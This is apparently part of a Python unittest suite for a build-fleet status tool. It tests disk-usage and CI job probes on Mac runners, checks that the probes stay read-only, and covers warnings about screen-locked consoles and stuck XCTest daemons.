                  "\n@fleet_cas\nyes\n@receipts\npresent\n" + "\n".join(map(json.dumps, receipts)) +
                  f"\n@now\n{now - 100}\n")
        row = fs.parse_disk(stdout, now)
        self.assertNotIn("/Users/", json.dumps(row))
        self.assertEqual((row["free"], row["low"], row["fleet_cas"]), (100 * GIB, 69 * GIB, True))
        self.assertEqual(row["families"][0], {"family": "hq", "bytes": 7 * GIB, "owner": "worker", "retired": True})
        self.assertEqual([f["family"] for f in row["families"]], ["hq", "tmp", "empty"])
        self.assertEqual(row["reclaimed_24h"], {"bytes": 2 * GIB, "count": 1})
        self.assertEqual((row["prune"]["result"], row["prune"]["node_store_bytes"]), ("ok", 5))
        self.assertEqual(row["prune"]["at"], now - 3600 + 100)  # moved onto this machine's clock
        self.assertEqual(row["gc"]["result"], "ran")  # "not due" is not a gc outcome
        self.assertEqual(row["gc"]["suspect_entries"], 0)  # the count, never the tool's text
        self.assertEqual(row["sizes_at"], 1799999100)

    def test_disk_output_stays_bounded(self):
        families = [{"family": f"f{i}" + "x" * 500, "bytes": i * GIB, "owner": "o" * 5000, "retired": True}
                    for i in range(5000)]
        huge = disk_row(families=families, error=None,
                        prune={"at": AT, "result": "failed " + "y" * 10_000}, fleet_cas=True,
                        gc={"at": AT, "result": "failed", "suspect_entries": "z" * 100_000})
        doc = build(disk=src({"hosts": {"mini-a": huge, "mini-b": huge, "not-in-manifest": huge,
                                        "coordinator": huge}}))
        self.assertLessEqual(len(fs.canonical(doc)), fs.MAX_DOCUMENT_BYTES)
        d = self.member(doc)["disk"]
        self.assertEqual(len(d["families"]), fs.MAX_DISK_FAMILIES)
        self.assertTrue(all(len(f["family"]) <= 60 and len(f["owner"]) <= 80 for f in d["families"]))
        self.assertIsNone(d["gc"]["suspect_entries"])
        self.assertLessEqual(len(fs.disk_line(d, AT)), fs.MAX_TEXT)
        self.assertTrue(all(len(f["summary"]) <= fs.MAX_TEXT for f in doc["findings"]))
        # never_touch members get findings but no command
        mine = [f for f in doc["findings"] if f["member"] == "coordinator"]
        self.assertTrue(mine)
        self.assertFalse([f for f in mine if f["action"]["command"] or f["action"]["who"] == "agent"])

    def test_disk_probe_skips_never_touch_and_is_read_only(self):
        seen = []
        with mock.patch.object(fs, "disk_host", side_effect=lambda h, u: seen.append(h) or {"reachable": True}):
            fs.collect_disk({"ssh_user": "builder", "never_touch": ["coordinator"]}, ["mini-a", "coordinator"])
        self.assertEqual(seen, ["mini-a"])
        for word in (" rm ", "--apply", "--refresh", "--pressure", "unlink", "delete", ">"):
            self.assertNotIn(word, fs.DISK_SCRIPT.replace("2>/dev/null", ""))
        with mock.patch.object(fs.subprocess, "run",
                               return_value=subprocess.CompletedProcess([], 255, "", "ssh: timed out")):
            self.assertFalse(fs.disk_host("mini-a", "builder")["reachable"])


    def test_cargo_target_is_listed_but_not_counted_twice(self):
        families = [{"family": "projects", "bytes": 40 * GIB, "owner": "", "retired": False},
                    {"family": "cargo-target", "bytes": 30 * GIB, "owner": "", "retired": False}]
        d = self.member(build(disk=disk(mini_a=disk_row(families=families))))["disk"]
        self.assertEqual(d["cache_bytes"], 40 * GIB)
        self.assertEqual(len(d["families"]), 2)

    def test_a_prune_line_without_a_readable_time_is_silent_not_new(self):
        doc = build(disk=disk(mini_a=disk_row(fleet_cas=True, prune_job_at=AT - 60,
                                              prune={"at": None, "result": "ok"})))
        [f] = by_id(doc, "disk.prune_silent@mini-a")
        self.assertIn("no readable time", f["summary"])

    def test_the_probe_script_runs_against_a_fake_home(self):
        report = {"free": 50 * GIB, "total": 460 * GIB, "filesystems": [
            {"free": 50 * GIB, "total": 460 * GIB, "low": 69 * GIB}],
            "owners": {"hq": {"owner": "worker", "retired": True}},
            "items": [{"family": "hq", "path": "/x", "bytes": 6 * GIB}]}
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            tool = home / ".local/bin/glaeda-disk"
            tool.parent.mkdir(parents=True)
            tool.write_text("#!/bin/sh\ncat <<'JSON'\n" + json.dumps(report, indent=2) + "\nJSON\n")
            tool.chmod(0o755)
            (home / ".cache/glaeda-disk").mkdir(parents=True)
            (home / ".cache/glaeda-disk/sizes.json").write_text("{}")
            (home / "Library/Logs").mkdir(parents=True)
            (home / "Library/Logs/glaeda-fleet-cas-prune.jsonl").write_text(
                json.dumps({"at": "2027-01-15T07:00:00+0000", "result": "failed", "role": "reader"}) + "\n")
            (home / "Projects/recovery/disk-reclaim").mkdir(parents=True)
            (home / "Projects/recovery/disk-reclaim/receipts.jsonl").write_text("not json\n")
            proc = subprocess.run(["/bin/sh", "-c", fs.DISK_SCRIPT], capture_output=True, text=True, timeout=30,
                                  env={"HOME": str(home), "PATH": "/usr/bin:/bin"}, check=False)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        row = fs.parse_disk(proc.stdout, AT)
        self.assertEqual((row["free"], row["low"], row["error"]), (50 * GIB, 69 * GIB, None))
        self.assertEqual(row["prune"]["result"], "failed")
        self.assertEqual(row["reclaimed_24h"], {"bytes": 0, "count": 0})
        doc = build(disk=disk(mini_a=row))
        self.assertTrue(by_id(doc, "disk.pressure@mini-a"))
        self.assertTrue(by_id(doc, "disk.retired_owner:hq@mini-a"))
        self.assertTrue(by_id(doc, "disk.prune_failed@mini-a"))

    def test_real_glaeda_disk_json_parses(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "tmp"
            (root / "big").mkdir(parents=True)
            (root / "big" / "blob").write_bytes(b"x" * (2 * 1024 * 1024))
            proc = subprocess.run([sys.executable, str(SCRIPT.parent / "glaeda-disk"), "--json", "--top", "0",
                                   "--no-snapshot", "--min-mib", "0", "--family", "tmp",
                                   "--root-override", f"tmp={root}"],
                                  capture_output=True, text=True, timeout=120, check=False)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        row = fs.parse_disk("@disk\n" + proc.stdout + "\n@now\n1800000000\n", AT)
        self.assertIsNone(row["error"])
        self.assertGreater(row["total"], 0)
        self.assertIsNotNone(row["low"])
        self.assertEqual([f["family"] for f in row["families"]], ["tmp"])
        self.assertGreaterEqual(row["families"][0]["bytes"], 2 * 1024 * 1024)

    def test_html_has_a_disk_column(self):
        page = fs.render_html(build(disk=disk(mini_a=disk_row(free=30 * GIB))))
        self.assertIn("<th>disk</th>", page)
        self.assertIn("UNDER PRESSURE", page)


def job_record(job="macos-compile-admission", verdict="clear", ended=AT - 600, reasons=None, **extra):
    return {"schema": "glaeda-cmux-job/v1", "job": job, "run_id": "123", "runner": "mini-a-glaeda",
            "seconds": 2200.0, "ended_at": ended, "cores": {"job": 9.0, "other_runner_jobs": 0.5, "outside": 5.1},
            "load": {"mean": 30.5, "max": 36.4}, "verdict": verdict, "reasons": reasons or [], **extra}


def jobs_stdout(*records, now=AT):
    return "@jobs\n" + "\n".join(json.dumps(r) for r in records) + "\n@now\n" + str(now) + "\n"


class JobsTests(unittest.TestCase):
    def member(self, doc, name="mini-a"):
        return next(m for m in doc["members"] if m["name"] == name)

    def test_contended_jobs_warn_with_the_reason_and_a_read_only_command(self):
        row = fs.parse_jobs(jobs_stdout(
            job_record(),
            job_record(verdict="contended", reasons=["outside processes averaged 5.1 cores (top: zig (cmux))",
                                                     "load averaged 30.5 on 14 cores"]),
            job_record(verdict="contended", ended=AT - 3 * 86400, reasons=["old"])), AT)
        self.assertEqual((row["count"], row["contended"]), (2, 1))
        doc = build(jobs=src({"hosts": {"mini-a": row}}))
        [f] = by_id(doc, "jobs.contended@mini-a")
        self.assertEqual(f["severity"], "warn")
        self.assertIn("1 of 2 runner jobs in 24 h ran contended", f["summary"])
        self.assertIn("macos-compile-admission (run 123)", f["summary"])
        self.assertIn("zig (cmux)", f["summary"])
        self.assertEqual(f["action"]["command"], "ssh -- mini-a 'tail -n 20 ~/Library/Logs/glaeda-cmux-jobs.jsonl'")
        self.assertTrue(f["action"]["safe_to_apply"])
        self.assertIn("1 contended", fs.render_text(doc))
        self.assertIn("<th>jobs (24 h)</th>", fs.render_html(doc))
        self.assertEqual(self.member(doc)["jobs"]["contended_jobs"][0]["outside_cores"], 5.1)

    def test_clear_jobs_and_missing_logs_are_quiet(self):
        clear = fs.parse_jobs(jobs_stdout(job_record(), job_record()), AT)
        empty = fs.parse_jobs("@jobs\n\n@now\n" + str(AT) + "\n", AT)
        doc = build(jobs=src({"hosts": {"mini-a": clear, "mini-b": empty}}))
        self.assertFalse(by_id(doc, "jobs.contended"))
        self.assertEqual(fs.jobs_line(self.member(doc)["jobs"]), "2 jobs, 0 contended")
        self.assertEqual(fs.jobs_line(self.member(doc, "mini-b")["jobs"]), "no job records")

    def test_foreign_or_cut_lines_are_skipped(self):
        stdout = "@jobs\n" + '{"schema":"something-else"}\n' + 'ma","verdict":"contended"}\n' + \
                 json.dumps(job_record()) + "\n@now\n" + str(AT) + "\n"
        self.assertEqual(fs.parse_jobs(stdout, AT)["count"], 1)

    def test_started_and_refused_lines_are_not_host_records(self):
        # a started line carrying ended_at would still not count; only completed (or pre-event) lines do
        stdout = jobs_stdout(job_record(event="started", verdict="contended"), job_record(event="refused"),
                             job_record(event="completed"), job_record())
        self.assertEqual((fs.parse_jobs(stdout, AT)["count"], fs.parse_jobs(stdout, AT)["contended"]), (2, 0))

    def test_jobs_script_drops_started_and_refused_on_the_host(self):
        with tempfile.TemporaryDirectory() as home:
            logs = Path(home) / "Library" / "Logs"
            logs.mkdir(parents=True)
            lines = []
            for n in range(500):
                lines.append(json.dumps(job_record(event="started", run_id=str(n)), separators=(",", ":"), sort_keys=True))
                lines.append(json.dumps(job_record(event="completed", run_id=str(n)), separators=(",", ":"), sort_keys=True))
            (logs / "glaeda-cmux-jobs.jsonl").write_text("\n".join(lines) + "\n")
            out = subprocess.run(["/bin/sh", "-c", fs.JOBS_SCRIPT], env={"HOME": home, "PATH": "/usr/bin:/bin"},
                                 capture_output=True, text=True, timeout=30).stdout
        self.assertNotIn('"event":"started"', out)
        self.assertEqual(out.count('"event":"completed"'), 400, "the tail keeps 400 completed records")

    def test_a_locked_console_warns_a_person_and_shows_on_the_line(self):
        session = '"kCGSSessionOnConsoleKey"=Yes,"kCGSessionLoginDoneKey"=Yes,"kCGSSessionUserNameKey"="cmux"'
        locked = jobs_stdout(job_record()).replace(
            "@now", f'@console\n      "IOConsoleUsers" = ({{{session},"CGSSessionScreenIsLocked"=Yes}})\n@now')
        nobody = jobs_stdout().replace("@now", '@console\n      "IOConsoleLocked" = Yes\n@now')
        unlocked = jobs_stdout(job_record()).replace("@now", f'@console\n      "IOConsoleUsers" = ({{{session}}})\n@now')
        rows = {"mini-a": fs.parse_jobs(locked, AT), "mini-b": fs.parse_jobs(nobody, AT)}
        self.assertEqual(rows["mini-a"]["console"], {"state": "locked", "user": "cmux"})
        self.assertIsNone(fs.parse_jobs(jobs_stdout(job_record()), AT)["console"], "no ioreg (Linux): unknown")
        doc = build(jobs=src({"hosts": rows}))
        [f] = by_id(doc, "jobs.console_locked@mini-a")
        self.assertEqual((f["severity"], f["action"]["who"], f["action"]["command"]), ("warn", "person", None))
        self.assertIn("console session (cmux) is screen-locked: GUI jobs are refused here", f["summary"])
        self.assertIn("turn off the screen lock", f["action"]["note"])
        [f] = by_id(doc, "jobs.console_no_user@mini-b")
        self.assertIn("no user is logged in at the console", f["summary"])
        quiet = build(jobs=src({"hosts": {"mini-a": fs.parse_jobs(unlocked, AT)}}))
        self.assertFalse(by_id(quiet, "jobs.console"))
        self.assertEqual(self.member(quiet)["jobs"]["console"], {"state": "unlocked", "user": "cmux"})
        self.assertEqual(fs.jobs_line(self.member(quiet)["jobs"]), "1 jobs, 0 contended")
        self.assertEqual(fs.jobs_line(self.member(doc)["jobs"]), "1 jobs, 0 contended; console LOCKED")
        self.assertEqual(fs.jobs_line(self.member(doc, "mini-b")["jobs"]), "no job records; console NO USER")
        self.assertIn("console LOCKED", fs.render_text(doc))

    def test_a_stuck_testmanagerd_refusal_warns(self):
        stuck = {"schema": "glaeda-cmux-job/v1", "event": "refused", "at": AT - 300, "job": "app-host-unit-tests",
                 "decision": "testmanagerd: stuck: pid 4242 outlived SIGKILL"}
        old = {**stuck, "at": AT - 3 * 86400}
        other = {**stuck, "decision": "capacity: the gui token is taken"}
        stdout = ("@jobs\n" + json.dumps(job_record()) + "\n@stuck\n" + "\n".join(json.dumps(r) for r in (stuck, old, other))
                  + "\n@now\n" + str(AT) + "\n")
        row = fs.parse_jobs(stdout, AT)
        self.assertEqual((row["count"], row["testmanagerd_stuck"], row["testmanagerd_stuck_at"]), (1, 1, AT - 300))
        doc = build(jobs=src({"hosts": {"mini-a": row}}))
        [f] = by_id(doc, "jobs.testmanagerd_stuck@mini-a")
        self.assertEqual(f["severity"], "warn")
        self.assertIn("1 XCTest job(s) refused in 24 h", f["summary"])
        self.assertEqual(f["action"]["command"], "ssh -- mini-a '/usr/bin/pgrep -lf testmanagerd'")
        self.assertTrue(f["action"]["safe_to_apply"])
        quiet = build(jobs=src({"hosts": {"mini-a": fs.parse_jobs(jobs_stdout(job_record()), AT)}}))
        self.assertFalse(by_id(quiet, "jobs.testmanagerd_stuck"))

    def test_jobs_script_keeps_only_stuck_testmanagerd_refusals(self):
        with tempfile.TemporaryDirectory() as home:
            logs = Path(home) / "Library" / "Logs"
            logs.mkdir(parents=True)
            compact = {"separators": (",", ":")}  # as the hook writes them
            lines = [json.dumps(job_record(event="refused", decision="capacity: the gui token is taken"), **compact),
                     json.dumps(job_record(event="refused", decision="testmanagerd: stuck: pid 1 outlived SIGKILL"),
                                **compact),
                     json.dumps(job_record(event="completed"), **compact)]
            (logs / "glaeda-cmux-jobs.jsonl").write_text("\n".join(lines) + "\n")
            out = subprocess.run(["/bin/sh", "-c", fs.JOBS_SCRIPT], env={"HOME": home, "PATH": "/usr/bin:/bin"},
                                 capture_output=True, text=True, timeout=30).stdout
        jobs, _, stuck = out.partition("@stuck")
        self.assertEqual(jobs.count('"event":"completed"'), 1)
        self.assertNotIn("refused", jobs)
        self.assertEqual(stuck.count("testmanagerd: stuck"), 1)
        self.assertNotIn("gui token", stuck)

    def test_jobs_probe_is_read_only_and_skips_never_touch(self):
        seen = []
        with mock.patch.object(fs, "jobs_host", side_effect=lambda h, u: seen.append(h) or {"reachable": True}):
            fs.collect_jobs({"ssh_user": "builder", "never_touch": ["coordinator"]}, ["mini-a", "coordinator"])
        self.assertEqual(seen, ["mini-a"])
        for word in (" rm ", "unlink", "delete", ">", "--apply"):
            self.assertNotIn(word, fs.JOBS_SCRIPT.replace("2>/dev/null", ""))


if __name__ == "__main__":
    unittest.main()
